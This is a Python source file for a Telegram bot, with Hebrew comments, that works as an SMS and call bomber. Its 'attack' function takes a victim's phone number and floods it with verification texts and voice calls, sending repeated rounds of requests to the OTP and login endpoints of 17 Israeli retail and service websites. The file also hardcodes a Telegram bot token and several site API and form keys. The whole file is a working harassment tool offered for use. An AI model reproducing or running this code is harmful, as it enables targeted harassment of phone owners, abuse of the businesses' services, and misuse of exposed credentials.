import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

# --- שרת Flask לשמירה על הבוט פעיל ב-Render ---
app = Flask('')
@app.route('/')
def home(): return "Bot is Online"

def keep_alive():
    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
    t.start()

# --- הגדרת הבוט עם הטוקן המעודכן ---
API_TOKEN = '8620606926:AAFYojGPF-_ex76iTJtVEbgZaVvj1Tu2ivA'
bot = telebot.TeleBot(API_TOKEN)

def attack(m, target, rounds):
    # התאמת מספר עם מקף עבור ה-API של משלוחה
    target_dashed = f"{target[:3]}-{target[3:]}"
    
    # רשימת ה-17 המנצחת (SMS + שיחות)
    apis = [
        # --- משלוחה: שיחה קולית ---
        {
            "n": "Mishloha Call", 
            "u": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=c049beda-2a99-442c-afa9-db86ea140940&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=7d518ec4-795f-88a3-7686-08ac80628205&culture=he&apiVersion=2", 
            "d": {"phoneNumber": target_dashed, "sourceFrom": "AuthJS", "isCalling": True, "sessionID": "7d518ec4-795f-88a3-7686-08ac80628205"}, 
            "type": "json"
        },
        # --- משלוחה: SMS ---
        {
            "n": "Mishloha SMS", 
            "u": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=c049beda-2a99-442c-afa9-db86ea140940&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=7d518ec4-795f-88a3-7686-08ac80628205&culture=he&apiVersion=2", 
            "d": {"phoneNumber": target_dashed, "sourceFrom": "AuthJS", "isCalling": False, "sessionID": "7d518ec4-795f-88a3-7686-08ac80628205"}, 
            "type": "json"
        },
        {"n": "Hamal", "u": "https://users-auth.hamal.co.il/auth/send-auth-code", "d": {"value": target, "type": "phone", "projectId": "1"}, "type": "json"},
        {"n": "GoMobile", "u": "https://api.gomobile.co.il/api/send-otp", "d": {"phone": target}, "type": "json"},
        {"n": "Onot", "u": "https://www.onot.co.il/customer/ajax/post/", "d": {"form_key": "cis1GHI1WxfdOMSR", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Fox Home", "u": "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "9c47a6a0-db2f-4be6-a45d-5b8548fd11c2"}, "type": "json"},
        {"n": "Zygo", "u": "https://api.zygo.co.il/v1/auth/request-otp", "d": {"phone": target}, "type": "json"},
        {"n": "Carolina Lemke", "u": "https://www.carolinalemke.co.il/customer/ajax/post/", "d": {"form_key": "JXH1yoC9UP152sIH", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Sacara", "u": "https://www.sacara.co.il/customer/ajax/post/", "d": {"form_key": "HeTF9cqgdUzM05qO", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}, "type": "json"},
        {"n": "Gali", "u": "https://www.gali.co.il/customer/ajax/post/", "d": {"form_key": "OaMKKqrpQ3mzS4uo", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Urbanica", "u": "https://www.urbanica-wh.com/customer/ajax/post/", "d": {"form_key": "1kjI9qhbZ7bPMivW", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Delta", "u": "https://www.delta.co.il/customer/ajax/post/", "d": {"form_key": "vmG08wd94ASHHMPp", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Step In", "u": "https://www.stepin.co.il/customer/ajax/post/", "d": {"form_key": "jzm8zMmOseKijwBO", "bot_validation": "1", "type": "login", "telephone": target}, "type": "form"},
        {"n": "Teva Naot", "u": "https://www.tevanaot.co.il/apps/api/otp/request", "d": {"phone": target}, "type": "json"},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "8baff678-a092-4f3e-b08d-26adf214696b"}, "type": "json"},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}, "type": "json"}
    ]
    
    headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest"}
    total_success, total_fail = 0, 0

    for r in range(int(rounds)):
        round_success, round_fail = 0, 0
        for site in apis:
            try:
                if site["type"] == "json":
                    res = requests.post(site["u"], json=site["d"], headers=headers, timeout=6)
                else:
                    res = requests.post(site["u"], data=site["d"], headers=headers, timeout=6)
                
                if res.status_code in [200, 201]: round_success += 1
                else: round_fail += 1
            except: round_fail += 1
            
            # דיליי מהיר של 0.1 שניות בין אתרים
            time.sleep(0.1)
        
        total_success += round_success
        total_fail += round_fail
        bot.send_message(m.chat.id, f"⚡️ סבב {r+1} הושלם!\n✅ הצלחות: {round_success} | ❌ נכשלו: {round_fail}")
        
        if r < int(rounds) - 1:
            time.sleep(1.5) # הפסקה קלה בין סבבים

    bot.send_message(m.chat.id, f"🏁 **הפצצה הושלמה!**\n✅ סה\"כ הצלחות: {total_success}\n❌ סה\"כ נכשלו: {total_fail}")

@bot.message_handler(func=lambda m: True)
def handle(m):
    try:
        parts = m.text.split()
        if len(parts) == 2:
            rounds, target = parts[0], parts[1]
            if rounds.isdigit() and target.isdigit() and len(target) >= 9:
                bot.reply_to(m, f"🔥 מפעיל {rounds} סבבים של SMS ושיחות על {target}...\n(17 פעולות בכל סבב!)")
                attack(m, target, rounds)
            else:
                bot.reply_to(m, "פורמט: [סבבים] [מספר]")
        else:
            bot.reply_to(m, "לדוגמה: 2 0521234567")
    except:
        bot.reply_to(m, "שגיאה בביצוע הפעולה.")

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
